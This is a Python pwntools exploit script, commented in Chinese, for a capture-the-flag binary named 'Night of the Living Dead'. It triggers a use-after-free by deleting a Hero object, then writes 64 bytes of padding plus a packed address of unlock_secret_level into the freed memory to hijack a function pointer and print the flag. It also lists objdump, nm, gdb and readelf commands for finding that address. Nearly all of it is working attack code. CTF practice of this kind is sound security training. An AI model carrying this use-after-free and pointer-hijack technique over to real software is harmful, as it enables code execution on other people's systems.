#!/usr/bin/env python3
"""
Night of the Living Dead - Exploit Script
利用Use-After-Free + 函数指针劫持获取flag
"""

import struct
import sys
from pwn import *

def exploit_local(target_path="./chall"):
    """本地利用脚本"""
    print("[+] 启动本地利用...")
    
    # 启动目标程序
    p = process(target_path)
    
    # 第一步：创建Hero
    print("[+] 步骤1: 创建Hero")
    p.sendlineafter(b"Choice: ", b"1")
    p.sendlineafter(b"Enter hero name: ", b"TestHero")
    
    # 获取Hero的地址用于调试
    response = p.recvline()
    print(f"[DEBUG] {response.decode().strip()}")
    
    # 第二步：删除Hero (触发Use-After-Free)
    print("[+] 步骤2: 删除Hero (Use-After-Free)")
    p.sendlineafter(b"Choice: ", b"2")
    
    # 第三步：训练假人 (在释放的内存位置写入恶意数据)
    print("[+] 步骤3: 训练假人 (函数指针劫持)")
    p.sendlineafter(b"Choice: ", b"4")
    
    # 构造payload: 64字节填充 + unlock_secret_level函数地址
    # 注意: 需要先获取unlock_secret_level的实际地址
    print("[!] 需要先获取unlock_secret_level的地址...")
    
    # 64字节填充
    payload = b"A" * 64
    
    # 函数地址占位符 (需要动态获取或静态分析)
    # 这里使用占位符，实际利用时需要替换为真实地址
    unlock_secret_level_addr = 0x0  # 需要通过调试或反汇编获取
    
    if unlock_secret_level_addr == 0:
        print("[!] 错误: 需要先获取unlock_secret_level函数的地址")
        print("[!] 使用gdb或objdump分析二进制文件获取地址")
        p.close()
        return False
    
    # 小端序打包地址
    payload += struct.pack("<Q", unlock_secret_level_addr)
    
    p.sendlineafter(b"Describe the training dummy stats: ", payload)
    
    # 第四步：执行攻击 (触发函数指针)
    print("[+] 步骤4: 执行攻击 (触发exploit)")
    p.sendlineafter(b"Choice: ", b"3")
    
    # 接收结果
    try:
        result = p.recvall(timeout=2)
        print(f"[+] 结果: {result.decode()}")
        return True
    except:
        print("[-] 利用失败或超时")
        return False
    finally:
        p.close()

def get_function_address():
    """获取unlock_secret_level函数地址的辅助脚本"""
    print("[+] 获取函数地址的方法:")
    print("1. 使用objdump: objdump -t chall | grep unlock_secret_level")
    print("2. 使用nm: nm chall | grep unlock_secret_level") 
    print("3. 使用gdb:")
    print("   gdb ./chall")
    print("   (gdb) info functions unlock_secret_level")
    print("   (gdb) p unlock_secret_level")
    print("4. 使用readelf: readelf -s chall | grep unlock_secret_level")

def exploit_with_address(address_hex):
    """使用指定地址进行利用"""
    target_path = "./chall"
    unlock_addr = int(address_hex, 16)
    
    print(f"[+] 使用unlock_secret_level地址: 0x{unlock_addr:x}")
    
    p = process(target_path)
    
    try:
        # 创建Hero
        p.sendlineafter(b"Choice: ", b"1")
        p.sendlineafter(b"Enter hero name: ", b"TestHero")
        p.recvline()  # 接收Hero创建信息
        
        # 删除Hero
        p.sendlineafter(b"Choice: ", b"2")
        
        # 训练假人并注入恶意payload
        p.sendlineafter(b"Choice: ", b"4")
        
        payload = b"A" * 64 + struct.pack("<Q", unlock_addr)
        p.sendlineafter(b"Describe the training dummy stats: ", payload)
        
        # 执行攻击
        p.sendlineafter(b"Choice: ", b"3")
        
        # 接收flag
        result = p.recvall(timeout=3)
        print(f"[SUCCESS] 获取到输出: {result.decode()}")
        
    except Exception as e:
        print(f"[-] 利用失败: {e}")
    finally:
        p.close()

if __name__ == "__main__":
    if len(sys.argv) == 2:
        # 如果提供了地址参数
        exploit_with_address(sys.argv[1])
    else:
        print("Night of the Living Dead - Exploit")
        print("用法:")
        print("  python3 exploit.py <unlock_secret_level_address>")
        print("  例如: python3 exploit.py 0x40123a")
        print()
        get_function_address()